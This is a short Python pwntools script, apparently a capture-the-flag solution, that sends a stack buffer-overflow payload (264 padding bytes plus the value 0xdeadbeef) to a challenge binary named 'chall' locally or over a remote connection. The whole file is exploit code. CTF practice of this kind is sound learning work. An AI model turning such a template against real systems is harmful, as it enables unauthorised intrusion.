from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "chall"
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

io = start()

padding = 264

payload = flat(
    padding * b'A',
    p64(0xdeadbeef)
)

io.sendlineafter(b"see?",payload)

io.interactive()